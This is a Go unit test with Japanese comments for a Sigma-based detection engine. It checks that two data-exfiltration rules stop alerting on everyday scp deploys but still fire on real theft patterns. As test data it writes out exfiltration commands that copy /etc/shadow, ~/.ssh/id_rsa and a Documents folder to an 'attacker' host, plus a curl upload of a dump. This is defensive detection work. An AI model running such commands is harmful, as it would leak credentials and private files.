package detection

import "testing"

// T1048 / T1041 — 素の scp では鳴らないこと。
//
// 対象 2 本 (Data Exfiltration via curl/wget Upload (Linux) / macOS Data
// Exfiltration via curl or scp Upload) は、どちらも `scp ` という**修飾なしの 1 語**
// を単独の発火条件に持っていた。同じルールの curl / wget 枝は上げ側フラグを要求して
// いるのに scp だけ無条件で、**ルール自身の中に不整合があった**。
//
// curl は取得にも送信にも使えるのでフラグで向きを判別する必要があるが、scp は
// そもそも転送コマンドである。「scp が動いた」＝「誰かが ssh 越しにファイルを
// コピーした」でしかなく、日常のデプロイと区別がつかない。
//
// 修飾の根拠はリポジトリに既にある。migration 306 の Linux キルチェーン相関は
// stage_2 に `scp /etc` / `scp ~/.ssh` と機微パスで修飾して置いており、
// correlation_killchains_test.go の相関は素の `scp ` を置くが stage_1
// (アーカイブ作成) とセットでしか成立しない。**弱い信号の置き場所は既にあり、
// 単独アラートとして無修飾で鳴らしているのはこの 2 本だけが外れ値だった。**
func TestMigration429QualifiesScpBranch(t *testing.T) {
	blocks := migrationSigmaBlocks(t)
	for _, tc := range []struct{ title, image string }{
		{"Data Exfiltration via curl/wget Upload (Linux)", "/usr/bin/scp"},
		{"macOS Data Exfiltration via curl or scp Upload", "/usr/bin/scp"},
	} {
		t.Run(tc.title, func(t *testing.T) {
			blk, ok := blocks[tc.title]
			if !ok {
				t.Fatalf("ルール %q が migration から消えている", tc.title)
			}
			if blk.file != "429_qualify_scp_exfil_branch.sql" {
				t.Fatalf("429 の UPDATE 本文ではなく %s を拾っている——"+
					"狭める前の本文を試していることになる", blk.file)
			}
			ev := NewSigmaEvaluator()
			if err := ev.LoadRule(blk.body); err != nil {
				t.Fatalf("%s のロードに失敗: %v", blk.file, err)
			}
			fires := func(cmd string) bool {
				event := map[string]interface{}{"type": "process", "image": tc.image, "command_line": cmd}
				addPipelineSigmaAliases(event)
				for _, m := range ev.EvaluateEvent(event) {
					if m.RuleTitle == tc.title {
						return true
					}
				}
				return false
			}

			// 対照。実在する攻撃形が鳴らないなら、以下の沈黙チェックに意味が無い。
			if !fires(`scp -r /Users/v/Documents attacker@10.0.0.5:/tmp/`) {
				t.Fatal("対照が効いていない: 再帰的な回収が鳴らないので、" +
					"以下の沈黙チェックが通っても意味が無い")
			}

			// tests/fpsoak/profiles/ の実コマンドそのもの。いずれも -r を使わない。
			for _, c := range []struct{ cmd, why string }{
				{`scp dist/app.tar.gz deploy@10.21.0.9:/srv/releases/`, "dev-machine: 単一成果物の push"},
				{`scp deploy@10.21.0.9:/var/log/app.log ./tmp/`, "dev-machine: ログの取得"},
				{`scp ./dist/app-a1b2c3.zip deploy@app-staging-01.corp.example.co.jp:/srv/releases/`, "macbook: 単一成果物の push"},
				{`scp deploy@app-staging-01.corp.example.co.jp:/var/log/app.log /Users/ishikawa/Downloads/`, "macbook: ログの取得"},
			} {
				if fires(c.cmd) {
					t.Errorf("日常のデプロイで誤検知している (%s): %q", c.why, c.cmd)
				}
			}

			// 狭めても落ちてはならない側。
			for _, c := range []struct{ cmd, why string }{
				{`scp -r /Users/v/Documents attacker@10.0.0.5:/tmp/`, "dark_technique_wave3_test.go:82"},
				{`scp /etc/shadow attacker@10.0.0.5:/tmp/`, "migration 306 の相関が採る形"},
				{`scp ~/.ssh/id_rsa attacker@10.0.0.5:/tmp/`, "同上"},
				{`curl -T /data/dump.tar.gz https://198.51.100.9/u`, "curl 枝は従来どおり"},
			} {
				if !fires(c.cmd) {
					t.Errorf("持ち出しが検知されなくなった (%s): %q", c.why, c.cmd)
				}
			}
		})
	}
}
